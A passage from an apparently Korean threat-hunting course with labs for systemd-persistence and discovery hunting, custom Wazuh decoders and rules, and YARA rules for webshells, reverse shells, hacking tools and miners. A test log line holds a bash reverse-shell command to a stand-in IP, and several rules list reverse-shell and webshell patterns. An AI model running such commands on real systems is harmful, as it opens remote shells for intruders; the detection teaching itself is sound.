| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | 중간 |
| Credential Access | T1003.008 | OS Credential Dumping: /etc/passwd,shadow | 높음 |
| Discovery | T1082 | System Information Discovery | 중간 |
| Lateral Movement | T1021.004 | Remote Services: SSH | 높음 |
| Command and Control | T1071.001 | Application Layer Protocol: Web | 높음 |

## 실습 3.1: 가설 주도형 헌팅 -- T1543.002 (Systemd Service Persistence)

> **실습 목적**: "공격자가 systemd 서비스를 이용하여 지속성을 확보했다"는 가설을 수립하고, 실제 서버에서 체계적으로 검증한다.
>
> **배우는 것**: ATT&CK 기법 기반 가설 수립, 체계적 증거 수집, 베이스라인 비교를 통한 이상 탐지
>
> **결과 해석**: 최근 생성된 서비스 파일, 비정상 ExecStart 경로, 비표준 User 설정 등이 발견되면 추가 조사가 필요하다. 정상 서비스와의 차이점을 분석하여 참양성 여부를 판단한다.
>
> **실전 활용**: 이 헌팅 절차를 표준화하여 주간 헌팅 사이클에 포함한다. 발견된 비정상 서비스 패턴은 SIGMA 룰로 변환하여 자동 탐지에 반영한다.

```bash
# 가설: "공격자가 web 서버에서 T1543.002(Systemd Service)로
#        persistence를 설치했을 수 있다"

echo "=========================================="
echo " T1543.002 Systemd Persistence Hunting"
echo "=========================================="

# --- 헌팅 쿼리 1: 최근 생성/수정된 systemd 서비스 파일 ---
echo ""
echo "[1/5] 최근 7일 내 생성/수정된 서비스 파일"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'find /etc/systemd/system /usr/lib/systemd/system /run/systemd/system \
    -name "*.service" -mtime -7 2>/dev/null | while read f; do
      echo "=== $f ($(stat -c %y "$f" 2>/dev/null)) ==="
      head -20 "$f"
      echo ""
    done'

# --- 헌팅 쿼리 2: 비정상 ExecStart 경로 ---
echo ""
echo "[2/5] 비표준 경로에서 실행되는 서비스"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'grep -rh "ExecStart" /etc/systemd/system/ 2>/dev/null | \
    grep -v "^#" | \
    grep -v "/usr/\|/bin/\|/sbin/\|/lib/" | \
    sort -u'

# --- 헌팅 쿼리 3: 비정상 User 설정 서비스 ---
echo ""
echo "[3/5] root가 아닌 비표준 User로 실행되는 서비스"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'grep -rl "User=" /etc/systemd/system/ 2>/dev/null | while read f; do
      user=$(grep "User=" "$f" | head -1)
      echo "$f -> $user"
    done'

# --- 헌팅 쿼리 4: 최근 활성화(enable)된 서비스 ---
echo ""
echo "[4/5] 최근 활성화된 서비스 (journalctl)"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'journalctl --since "7 days ago" --no-pager | \
    grep -i "enabled\|Created symlink" | tail -20'

# --- 헌팅 쿼리 5: 서비스 파일 무결성 검증 ---
echo ""
echo "[5/5] 패키지 관리자에 등록되지 않은 서비스 파일"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'for f in /etc/systemd/system/*.service; do
      [ -f "$f" ] || continue
      dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null || \
        echo "[!] 미등록: $f"
    done 2>/dev/null'
```

> **명령어 해설**:
> - `find ... -mtime -7`: 최근 7일 이내에 수정된 파일을 검색한다. 공격자가 최근에 서비스를 설치했다면 이 기간에 포착된다.
> - `grep -v "/usr/\|/bin/\|/sbin/\|/lib/"`: 표준 시스템 경로를 제외하여 비정상 실행 경로만 필터링한다. `/tmp`, `/dev/shm`, 사용자 홈 디렉토리 등에서 실행되는 서비스는 의심 대상이다.
> - `dpkg -S` / `rpm -qf`: 파일이 어떤 패키지에 속하는지 확인한다. 패키지에 속하지 않는 서비스 파일은 수동으로 생성된 것이므로 추가 조사가 필요하다.
> - `stat -c %y`: 파일의 수정 타임스탬프를 사람이 읽을 수 있는 형식으로 출력한다.

> **트러블슈팅**:
> - `sshpass` 명령이 없는 경우: `apt install sshpass` 또는 SSH 키 기반 인증을 사용한다.
> - journalctl 권한 오류: `sudo journalctl`로 실행하거나, 사용자를 `systemd-journal` 그룹에 추가한다.
> - find 명령에서 Permission denied: `/run/systemd/system`은 root 권한이 필요할 수 있다. `sudo find`를 사용하거나, 접근 가능한 경로만 검색한다.

## 실습 3.2: 가설 주도형 헌팅 -- T1059.004 (Unix Shell) + T1082 (Discovery)

> **실습 목적**: 공격자의 정찰(Discovery) 활동 패턴을 탐지하는 헌팅 쿼리를 작성한다.
>
> **배우는 것**: 명령어 빈도 분석, 시간대 기반 이상 탐지, 사용자 행동 베이스라인 비교
>
> **결과 해석**: 짧은 시간 내에 whoami, id, uname, cat /etc/passwd 등 정찰 명령이 연속 실행된 경우 공격자의 초기 정찰 단계일 가능성이 높다.

```bash
echo "=========================================="
echo " T1059.004 + T1082 정찰 활동 헌팅"
echo "=========================================="

# --- 정찰 명령어 패턴 탐지 (auditd 기반) ---
echo ""
echo "[1/4] 정찰 명령어 빈도 분석"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'sudo ausearch -k tmp_exec --start recent 2>/dev/null | \
    grep -oP "(?<=a0=\")[^\"]*" | sort | uniq -c | sort -rn | head -20'

# --- bash_history에서 정찰 패턴 검색 ---
echo ""
echo "[2/4] bash_history 정찰 패턴 검색"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'for home_dir in /home/* /root; do
      hist="$home_dir/.bash_history"
      [ -f "$hist" ] || continue
      user=$(basename "$home_dir")
      count=$(grep -cE "whoami|id\b|uname|cat.*passwd|ifconfig|ip addr|hostname|netstat|ss -" "$hist" 2>/dev/null)
      if [ "$count" -gt 0 ]; then
        echo "[$user] 정찰 명령 $count건:"
        grep -nE "whoami|id\b|uname|cat.*passwd|ifconfig|ip addr|hostname|netstat|ss -" "$hist" 2>/dev/null | tail -10
      fi
    done'

# --- 비정상 시간대 명령 실행 (새벽 02-05시) ---
echo ""
echo "[3/4] 비정상 시간대(02:00-05:00) 명령 실행"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'sudo journalctl --since "7 days ago" --no-pager 2>/dev/null | \
    grep -P "^.{0,15}(02|03|04):\d{2}:\d{2}" | \
    grep -i "session\|login\|sudo\|su:" | tail -20'

# --- /tmp 및 /dev/shm 실행 파일 탐지 ---
echo ""
echo "[4/4] 임시 디렉토리 실행 파일 탐지"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null | while read f; do
      echo "=== $f ==="
      file "$f" 2>/dev/null
      md5sum "$f" 2>/dev/null
      ls -la "$f" 2>/dev/null
      echo ""
    done'
```

> **명령어 해설**:
> - `ausearch -k tmp_exec --start recent`: auditd에서 `tmp_exec` 키로 태그된 최근 이벤트를 검색한다. `--start recent`는 최근 10분간의 로그를 반환한다.
> - `grep -cE "whoami|id\b|..."`: 정규표현식으로 정찰 명령어 패턴을 매칭하고 건수를 카운트한다. `\b`는 단어 경계를 의미하여 `id`가 다른 단어의 일부로 매칭되는 것을 방지한다.
> - `grep -P "^.{0,15}(02|03|04):\d{2}:\d{2}"`: Perl 호환 정규표현식으로 새벽 2-4시 시간대의 로그를 필터링한다.
> - `file "$f"`: 파일의 타입을 식별한다. ELF 바이너리, 스크립트 등을 구분할 수 있다.

## 실습 3.3: OpsClaw 자동 다중 서버 헌팅

> **실습 목적**: OpsClaw Manager API를 이용하여 여러 서버에서 동시에 헌팅 쿼리를 실행한다.
>
> **배우는 것**: 자동화 헌팅 파이프라인 구축, 다중 서버 오케스트레이션, 결과 중앙 집약
>
> **결과 해석**: 각 서버의 헌팅 결과가 evidence로 자동 기록되며, summary API로 전체 결과를 한 번에 확인할 수 있다.
>
> **실전 활용**: 정기 헌팅 사이클을 OpsClaw Playbook으로 등록하고, 스케줄러로 주간/일간 자동 실행할 수 있다.

```bash
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

# 1. 헌팅 프로젝트 생성
echo "[1/4] 프로젝트 생성"
PROJECT_RESP=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "weekly-threat-hunt-w08",
    "request_text": "Week 08 ATT&CK 기반 위협 헌팅: T1053, T1543, T1059, T1082",
    "master_mode": "external"
  }')

PROJECT_ID=$(echo "$PROJECT_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null)
echo "프로젝트 ID: $PROJECT_ID"

# 2. Stage 전환: plan -> execute
echo "[2/4] Stage 전환"
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 3. 다중 서버 동시 헌팅 실행
echo "[3/4] 다중 서버 헌팅 실행"
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "find /etc/systemd/system -name *.service -mtime -7 -exec ls -la {} \\; 2>/dev/null && grep -r ExecStart /etc/systemd/system/ 2>/dev/null | grep -v /usr/ | grep -v /bin/ | grep -v /sbin/ | grep -v ^#",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null; cat /etc/cron.d/* 2>/dev/null | grep -v ^#",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "find /tmp /dev/shm /var/tmp -type f -executable -ls 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "find /etc/systemd/system -name *.service -mtime -7 -exec ls -la {} \\; 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "ss -tlnp | grep -v 127.0.0.1 && last -n 20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 4. 결과 요약 확인
echo ""
echo "[4/4] 헌팅 결과 요약"
sleep 5
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/${PROJECT_ID}/evidence/summary" | \
  python3 -m json.tool 2>/dev/null
```

> **트러블슈팅**:
> - `PROJECT_ID`가 빈 값인 경우: Manager API가 실행 중인지 `curl http://localhost:8000/health`로 확인한다.
> - execute-plan에서 `stage must be execute` 오류: `/plan`과 `/execute` 단계 전환이 순서대로 완료되었는지 확인한다.
> - SubAgent 연결 실패: 해당 서버의 SubAgent가 8002 포트에서 실행 중인지 확인한다. `curl http://10.20.30.80:8002/health`

## 3.4 베이스라인 이탈 탐지

베이스라인 이탈(Baseline Deviation) 탐지는 "정상 상태"를 먼저 정의하고, 그 기준에서 벗어나는 행위를 식별하는 기법이다. 시그니처 기반 탐지와 달리, 알려지지 않은 위협도 포착할 수 있다는 장점이 있다.

```bash
echo "=========================================="
echo " 베이스라인 이탈 탐지"
echo "=========================================="

# --- 네트워크 연결 베이스라인 ---
echo ""
echo "[1/3] 비정상 리스닝 포트 탐지"
echo "-------------------------------------------"
# 알려진 정상 포트 목록 (베이스라인)
KNOWN_PORTS="22 80 443 3000 8000 8001 8002 8080 5432 9200"

sshpass -p1 ssh web@10.20.30.80 \
  "ss -tlnp | awk 'NR>1 {print \$4}' | grep -oP ':\K\d+' | sort -un" | \
  while read port; do
    if ! echo "$KNOWN_PORTS" | grep -qw "$port"; then
      echo "[!] 베이스라인 이탈: 비정상 리스닝 포트 $port"
    fi
  done

# --- 프로세스 베이스라인 ---
echo ""
echo "[2/3] 비정상 프로세스 탐지 (부모-자식 관계)"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'ps -eo user,pid,ppid,comm,args --forest | \
    grep -E "www-data.*sh|www-data.*python|www-data.*perl|www-data.*nc" | \
    grep -v grep'

# --- 사용자 계정 베이스라인 ---
echo ""
echo "[3/3] 비정상 사용자 계정 탐지"
echo "-------------------------------------------"
sshpass -p1 ssh web@10.20.30.80 \
  'echo "=== UID 0 계정 (root 외) ===" && \
   awk -F: "\$3==0 && \$1!=\"root\" {print \$1}" /etc/passwd && \
   echo "=== 쉘 보유 계정 ===" && \
   grep -v "nologin\|false" /etc/passwd | grep -v "^#" && \
   echo "=== 최근 7일 내 생성된 계정 ===" && \
   find /home -maxdepth 1 -type d -mtime -7 2>/dev/null | grep -v "^/home$"'
```

> **명령어 해설**:
> - 베이스라인 포트 목록과 실제 리스닝 포트를 비교하여, 목록에 없는 포트가 열려 있으면 경고한다.
> - `ps -eo ... --forest`: 프로세스 트리를 출력한다. 웹 서버 프로세스(www-data)가 쉘(sh, bash)이나 스크립팅 언어(python, perl)를 자식 프로세스로 실행하고 있다면 웹쉘일 가능성이 있다.
> - `awk -F: "$3==0 && $1!=\"root\""`: UID가 0이면서 root가 아닌 계정을 탐지한다. 공격자가 백도어 계정을 UID 0으로 생성했을 수 있다.

---

# Part 4: 프로액티브 탐지 + YARA -- Wazuh 커스텀 디코더/룰, YARA 룰 작성, 자동화 헌팅 워크플로우 (50분)

## 4.1 Wazuh 커스텀 디코더 작성

Wazuh의 탐지 파이프라인은 **디코더(Decoder) -> 룰(Rule)** 2단계로 구성된다. 디코더는 원시 로그를 파싱하여 필드를 추출하고, 룰은 추출된 필드에 조건을 적용하여 알림을 생성한다.

커스텀 디코더가 필요한 경우:
- 비표준 로그 형식을 사용하는 애플리케이션
- 기존 디코더가 파싱하지 못하는 필드가 헌팅에 필요한 경우
- 자체 개발 애플리케이션의 보안 로그

## 실습 4.1: Wazuh 커스텀 디코더 + 룰 작성

> **실습 목적**: BunkerWeb WAF의 커스텀 로그를 파싱하는 디코더와, 이를 기반으로 위협을 탐지하는 룰을 작성한다.
>
> **배우는 것**: Wazuh 디코더 XML 문법, 정규표현식 기반 필드 추출, 커스텀 룰 작성, 디코더-룰 연동
>
> **결과 해석**: 디코더가 올바르게 로그를 파싱하면, 룰에서 조건에 맞는 이벤트를 탐지하여 알림을 생성한다. `wazuh-logtest` 도구로 디코더/룰 동작을 검증할 수 있다.
>
> **실전 활용**: 조직 내 모든 애플리케이션의 보안 로그를 Wazuh로 중앙 수집하고, 커스텀 디코더/룰로 통합 탐지 체계를 구축한다.

```bash
# Wazuh SIEM 서버에서 커스텀 디코더 작성
sshpass -p1 ssh siem@10.20.30.100 << 'REMOTE_EOF'

# === 커스텀 디코더 작성 ===
sudo tee /var/ossec/etc/decoders/local_threat_hunt.xml > /dev/null << 'DECODER_EOF'
<!-- OpsClaw Threat Hunting 커스텀 디코더 -->

<!-- 디코더 1: 의심스러운 명령 실행 로그 -->
<decoder name="suspicious_exec">
  <prematch>^SUSPICIOUS_EXEC:</prematch>
  <regex>^SUSPICIOUS_EXEC: user=(\S+) cmd=(\.+) pid=(\d+) ppid=(\d+)</regex>
  <order>user, command, pid, ppid</order>
</decoder>

<!-- 디코더 2: 파일 무결성 변경 보강 -->
<decoder name="file_integrity_ext">
  <parent>syscheck</parent>
  <prematch offset="after_parent">^Integrity checksum changed</prematch>
  <regex offset="after_prematch"> for: '(\.+)'</regex>
  <order>file_path</order>
</decoder>

<!-- 디코더 3: 네트워크 이상 탐지 -->
<decoder name="network_anomaly">
  <prematch>^NETANOMALY:</prematch>
  <regex>^NETANOMALY: src=(\S+) dst=(\S+) port=(\d+) proto=(\S+) bytes=(\d+)</regex>
  <order>srcip, dstip, dstport, protocol, bytes</order>
</decoder>
DECODER_EOF

echo "[+] 커스텀 디코더 작성 완료"

# === 커스텀 탐지 룰 작성 ===
sudo tee /var/ossec/etc/rules/local_threat_hunt.xml > /dev/null << 'RULES_EOF'
<!-- OpsClaw Threat Hunting 커스텀 탐지 룰 -->
<group name="threat_hunting,custom">

  <!-- 룰 1: 리버스 쉘 패턴 탐지 -->
  <rule id="100501" level="14">
    <decoded_as>suspicious_exec</decoded_as>
    <field name="command">\/dev\/tcp|nc -e|ncat -e|bash -i|python.*socket.*connect</field>
    <description>[TH] Reverse shell pattern detected: $(command)</description>
    <group>threat_hunting,reverse_shell,T1059.004</group>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- 룰 2: 정찰 명령 연속 실행 (5분 내 5회 이상) -->
  <rule id="100502" level="10" frequency="5" timeframe="300">
    <if_matched_group>audit_command</if_matched_group>
    <field name="audit.execve.a0">whoami|id|uname|hostname|ifconfig|ip|cat</field>
    <description>[TH] Discovery command burst detected from $(srcuser)</description>
    <group>threat_hunting,discovery,T1082</group>
    <mitre>
      <id>T1082</id>
    </mitre>
  </rule>

  <!-- 룰 3: crontab 수정 탐지 -->
  <rule id="100503" level="12">
    <if_sid>80700</if_sid>
    <field name="audit.key">crontab_mod</field>
    <description>[TH] Crontab modification detected - possible persistence (T1053.003)</description>
    <group>threat_hunting,persistence,T1053.003</group>
    <mitre>
      <id>T1053.003</id>
    </mitre>
  </rule>

  <!-- 룰 4: 임시 디렉토리 실행 파일 생성 -->
  <rule id="100504" level="10">
    <if_sid>550,553</if_sid>
    <field name="file">/tmp/|/dev/shm/|/var/tmp/</field>
    <description>[TH] Executable created in temp directory: $(file)</description>
    <group>threat_hunting,execution,T1059</group>
    <mitre>
      <id>T1059</id>
    </mitre>
  </rule>

  <!-- 룰 5: 대량 아웃바운드 트래픽 (데이터 반출 의심) -->
  <rule id="100505" level="12">
    <decoded_as>network_anomaly</decoded_as>
    <field name="bytes">^\d{7,}</field>
    <description>[TH] Large outbound transfer detected: $(bytes) bytes to $(dstip):$(dstport)</description>
    <group>threat_hunting,exfiltration,T1048</group>
    <mitre>
      <id>T1048</id>
    </mitre>
  </rule>

  <!-- 룰 6: SSH 브루트포스 후 성공 (횡이동 의심) -->
  <rule id="100506" level="13">
    <if_sid>5715</if_sid>
    <same_source_ip />
    <description>[TH] SSH login success after multiple failures from $(srcip) - lateral movement suspected</description>
    <group>threat_hunting,lateral_movement,T1021.004</group>
    <mitre>
      <id>T1021.004</id>
    </mitre>
  </rule>

</group>
RULES_EOF

echo "[+] 커스텀 탐지 룰 작성 완료"

# === 디코더/룰 문법 검증 ===
echo ""
echo "=== 문법 검증 ==="
sudo /var/ossec/bin/wazuh-analysisd -t 2>&1 | tail -5

REMOTE_EOF
```

> **명령어 해설**:
> - `<decoder>` 태그: Wazuh 디코더의 기본 단위이다. `<prematch>`로 해당 로그인지 먼저 판별하고, `<regex>`로 필드를 추출한다.
> - `<rule>` 태그의 `frequency`와 `timeframe`: 동일 조건의 이벤트가 timeframe(초) 내에 frequency 횟수 이상 발생하면 탐지한다. 정찰 명령 연속 실행을 탐지하는 데 유용하다.
> - `<if_sid>`: 특정 상위 룰이 먼저 매칭된 이벤트에 대해서만 이 룰을 평가한다. 5715는 Wazuh의 SSH 인증 성공 룰이다.
> - `<same_source_ip />`: 동일 출발지 IP에서 발생한 이벤트끼리만 상관분석한다.
> - `wazuh-analysisd -t`: 디코더와 룰의 XML 문법을 검증한다. 오류가 있으면 상세 메시지를 출력한다.

> **트러블슈팅**:
> - `wazuh-analysisd -t`에서 XML 파싱 에러: XML 특수문자(`<`, `>`, `&`)가 이스케이프되지 않았는지 확인한다. 정규표현식의 `|`는 XML에서 문제 없지만, `<`는 `&lt;`로 이스케이프해야 한다.
> - 룰이 탐지하지 못하는 경우: `wazuh-logtest` 도구에 테스트 로그를 입력하여 디코더/룰 매칭 과정을 단계별로 확인한다.

## 실습 4.2: Wazuh logtest를 이용한 디코더/룰 검증

> **실습 목적**: 작성한 커스텀 디코더와 룰이 정상 동작하는지 테스트 로그로 검증한다.
>
> **배우는 것**: wazuh-logtest 활용법, 디코더-룰 매칭 파이프라인 이해, 디버깅 기법

```bash
# Wazuh logtest로 커스텀 디코더/룰 검증
sshpass -p1 ssh siem@10.20.30.100 << 'REMOTE_EOF'

echo "=== 테스트 1: 리버스 쉘 로그 ==="
echo 'SUSPICIOUS_EXEC: user=www-data cmd=bash -i >& /dev/tcp/198.51.100.23/4444 0>&1 pid=12345 ppid=1234' | \
  sudo /var/ossec/bin/wazuh-logtest 2>/dev/null | grep -A5 "Phase\|Rule\|decoder"

echo ""
echo "=== 테스트 2: 네트워크 이상 로그 ==="
echo 'NETANOMALY: src=10.20.30.80 dst=198.51.100.50 port=443 proto=tcp bytes=52428800' | \
  sudo /var/ossec/bin/wazuh-logtest 2>/dev/null | grep -A5 "Phase\|Rule\|decoder"

echo ""
echo "=== 테스트 3: 정상 명령 (오탐 확인) ==="
echo 'SUSPICIOUS_EXEC: user=root cmd=systemctl restart nginx pid=5678 ppid=1' | \
  sudo /var/ossec/bin/wazuh-logtest 2>/dev/null | grep -A5 "Phase\|Rule\|decoder"

REMOTE_EOF
```

## 4.2 YARA 룰 작성

YARA는 악성코드 연구자가 멀웨어 샘플을 식별하고 분류하기 위해 만든 패턴 매칭 도구이다. 파일의 텍스트/바이너리 패턴, 파일 크기, 엔트로피 등 다양한 조건으로 파일을 분류할 수 있다. 위협 헌팅에서는 디스크의 의심 파일을 스캔하여 악성코드, 웹쉘, 해킹 도구를 탐지하는 데 활용한다.

### YARA 룰 구조

```
rule RuleName : tag1 tag2 {
    meta:
        description = "설명"
        author = "작성자"
        severity = "high"

    strings:
        $text1 = "문자열 패턴"
        $text2 = "다른 패턴" nocase
        $hex1 = { 4D 5A 90 00 }          // 16진수 패턴
        $regex1 = /정규표현식/i            // 정규식 패턴

    condition:
        2 of ($text*) or $hex1 at 0        // 논리 조건
}
```

## 실습 4.3: YARA 룰 작성 -- 웹쉘 및 해킹 도구 탐지

> **실습 목적**: 서버에 존재할 수 있는 웹쉘과 해킹 도구를 탐지하는 YARA 룰을 작성하고 실행한다.
>
> **배우는 것**: YARA 문법, 문자열/정규식/조건식 작성, 파일 스캔 실행, 결과 해석
>
> **결과 해석**: YARA 매칭 결과에서 탐지된 파일이 실제 악성인지 확인하기 위해 파일 내용, 생성 시간, 소유자를 추가로 조사한다.
>
> **실전 활용**: YARA 룰을 Wazuh의 active response와 연동하여, 새 파일이 생성될 때 자동으로 스캔하는 워크플로우를 구축한다.

```bash
# YARA 설치 확인 및 룰 작성
echo "=== YARA 설치 확인 ==="
which yara 2>/dev/null && yara --version || echo "[!] yara 미설치 - apt install yara 필요"

# YARA 룰 파일 생성
mkdir -p /tmp/yara_hunt
cat > /tmp/yara_hunt/webshell_detect.yar << 'YARA_EOF'
/*
 * OpsClaw Threat Hunting - 웹쉘 및 해킹 도구 탐지 YARA 룰
 * 작성일: 2026-04-03
 * 용도: 파일 시스템 스캔을 통한 프로액티브 웹쉘/악성코드 탐지
 */

rule PHP_Webshell_Generic : webshell php {
    meta:
        description = "일반적인 PHP 웹쉘 패턴 탐지"
        author = "OpsClaw Threat Hunting Team"
        severity = "critical"
        mitre_technique = "T1505.003"

    strings:
        $eval1 = "eval(" ascii nocase
        $eval2 = "assert(" ascii nocase
        $eval3 = "preg_replace" ascii nocase
        $shell1 = "system(" ascii nocase
        $shell2 = "exec(" ascii nocase
        $shell3 = "shell_exec(" ascii nocase
        $shell4 = "passthru(" ascii nocase
        $shell5 = "popen(" ascii nocase
        $encode1 = "base64_decode(" ascii nocase
        $encode2 = "gzinflate(" ascii nocase
        $encode3 = "str_rot13(" ascii nocase
        $obf1 = "$_GET" ascii nocase
        $obf2 = "$_POST" ascii nocase
        $obf3 = "$_REQUEST" ascii nocase
        $obf4 = "$_COOKIE" ascii nocase

    condition:
        (1 of ($eval*) or 1 of ($shell*)) and
        (1 of ($encode*) or 1 of ($obf*)) and
        filesize < 500KB
}

rule Python_Reverse_Shell : backdoor python {
    meta:
        description = "Python 리버스 쉘 스크립트 탐지"
        author = "OpsClaw Threat Hunting Team"
        severity = "critical"
        mitre_technique = "T1059.006"

    strings:
        $import1 = "import socket" ascii
        $import2 = "import subprocess" ascii
        $import3 = "import os" ascii
        $connect = ".connect((" ascii
        $shell1 = "subprocess.call" ascii
        $shell2 = "/bin/sh" ascii
        $shell3 = "/bin/bash" ascii
        $dup = "os.dup2" ascii

    condition:
        $import1 and $connect and
        (1 of ($shell*) or $dup) and
        filesize < 100KB
}

rule Linux_Hack_Tool : hacktool linux {
    meta:
        description = "일반적인 Linux 해킹 도구 탐지"
        author = "OpsClaw Threat Hunting Team"
        severity = "high"
        mitre_technique = "T1588.002"

    strings:
        $tool1 = "linpeas" ascii nocase
        $tool2 = "linenum" ascii nocase
        $tool3 = "linux-exploit-suggester" ascii nocase
        $tool4 = "pspy" ascii nocase
        $tool5 = "chisel" ascii nocase
        $tool6 = "socat" ascii
        $priv1 = "SUID" ascii
        $priv2 = "capabilities" ascii nocase
        $priv3 = "sudo -l" ascii
        $priv4 = "/etc/shadow" ascii

    condition:
        2 of ($tool*) or
        (1 of ($tool*) and 2 of ($priv*)) and
        filesize < 5MB
}

rule Crypto_Miner : miner cryptomining {
    meta:
        description = "크립토마이너 탐지"
        author = "OpsClaw Threat Hunting Team"
        severity = "high"
        mitre_technique = "T1496"

    strings:
        $pool1 = "stratum+tcp://" ascii nocase
        $pool2 = "stratum+ssl://" ascii nocase
        $pool3 = "pool.minergate" ascii nocase
        $pool4 = "xmrpool" ascii nocase
        $pool5 = "moneropool" ascii nocase
        $wallet = /[0-9a-zA-Z]{95}/ ascii
        $config1 = "\"algo\"" ascii
        $config2 = "\"url\"" ascii
        $config3 = "\"user\"" ascii
        $xmrig = "XMRig" ascii nocase

    condition:
        (1 of ($pool*) or $xmrig) and
        (1 of ($config*) or $wallet)
}

rule Suspicious_ELF_In_Temp : suspicious elf {
    meta:
        description = "임시 디렉토리의 의심 ELF 바이너리"
        author = "OpsClaw Threat Hunting Team"
        severity = "medium"
        mitre_technique = "T1059"

    strings:
        $elf_magic = { 7F 45 4C 46 }  // ELF 매직 바이트

    condition:
        $elf_magic at 0 and
        filesize < 10MB
}
YARA_EOF

echo "[+] YARA 룰 파일 생성: /tmp/yara_hunt/webshell_detect.yar"
echo ""

# YARA 스캔 실행
echo "=== 로컬 /tmp 스캔 ==="
yara -r -s /tmp/yara_hunt/webshell_detect.yar /tmp/ 2>/dev/null || \
  echo "[i] yara 미설치이거나 매칭 결과 없음"

echo ""
echo "=== web 서버 원격 스캔 ==="
# 룰 파일을 web 서버로 전송 후 스캔
scp -o StrictHostKeyChecking=no /tmp/yara_hunt/webshell_detect.yar \
  web@10.20.30.80:/tmp/webshell_detect.yar 2>/dev/null

sshpass -p1 ssh web@10.20.30.80 \
  'which yara >/dev/null 2>&1 && \
    yara -r -s /tmp/webshell_detect.yar /var/www/ /tmp/ /dev/shm/ 2>/dev/null || \
    echo "[!] yara 미설치 - sudo apt install yara 필요"'
```

> **명령어 해설**:
> - `yara -r -s`: `-r`은 재귀 디렉토리 스캔, `-s`는 매칭된 문자열도 함께 출력한다.
> - `nocase`: 대소문자를 구분하지 않고 매칭한다. PHP 함수는 대소문자를 가리지 않으므로 필수이다.
> - `{ 7F 45 4C 46 }`: ELF 파일의 매직 바이트(처음 4바이트)를 16진수로 표현한 것이다.
> - `$elf_magic at 0`: 파일의 오프셋 0(시작 위치)에서만 매칭한다. ELF 매직 바이트는 항상 파일 시작에 위치한다.
> - `filesize < 500KB`: 파일 크기 제한으로 오탐을 줄인다. 정상적인 대형 PHP 라이브러리가 매칭되는 것을 방지한다.

> **트러블슈팅**:
> - `yara` 명령이 없는 경우: `sudo apt install yara` 또는 소스에서 빌드한다. `apt install libyara-dev`로 라이브러리도 함께 설치한다.
> - "undefined string" 에러: YARA 룰의 strings 섹션에서 정의한 변수명과 condition에서 참조하는 변수명이 일치하는지 확인한다.
> - 스캔 속도가 느린 경우: `-r` 옵션으로 대형 디렉토리를 스캔하면 시간이 오래 걸릴 수 있다. `-p` 옵션으로 스레드 수를 지정하거나, 스캔 범위를 좁힌다.

## 실습 4.4: Wazuh + YARA 통합 자동화 워크플로우

> **실습 목적**: Wazuh의 파일 무결성 감시(FIM)와 YARA 스캔을 연동하여, 새 파일이 생성되면 자동으로 YARA 스캔을 수행하는 워크플로우를 구축한다.
>
> **배우는 것**: Wazuh active response, FIM-YARA 연동, 자동화 헌팅 파이프라인
>
> **결과 해석**: /tmp 등 감시 대상 디렉토리에 새 파일이 생성되면, Wazuh FIM이 이를 감지하고 active response로 YARA 스캔을 트리거한다. 악성 파일이 발견되면 높은 레벨의 알림이 생성된다.
>
> **실전 활용**: 웹 서버의 업로드 디렉토리, /tmp, /dev/shm 등을 감시하여 드롭된 악성 파일을 자동으로 탐지한다.

```bash
# Wazuh FIM + YARA 연동 설정
sshpass -p1 ssh siem@10.20.30.100 << 'REMOTE_EOF'

# 1. YARA 스캔 스크립트 (active response)
sudo tee /var/ossec/active-response/bin/yara_scan.sh > /dev/null << 'SCRIPT_EOF'
#!/bin/bash
# Wazuh Active Response: YARA 자동 스캔
# FIM 이벤트에서 파일 경로를 받아 YARA 스캔 수행

LOCAL=$(dirname $0)
YARA_RULES="/var/ossec/etc/yara/rules/webshell_detect.yar"
LOG_FILE="/var/ossec/logs/active-responses.log"

read INPUT_JSON
FILENAME=$(echo $INPUT_JSON | jq -r '.parameters.alert.syscheck.path // empty')

if [ -z "$FILENAME" ] || [ ! -f "$FILENAME" ]; then
    echo "$(date) yara_scan: no valid file path" >> $LOG_FILE
    exit 0
fi

if [ -f "$YARA_RULES" ]; then
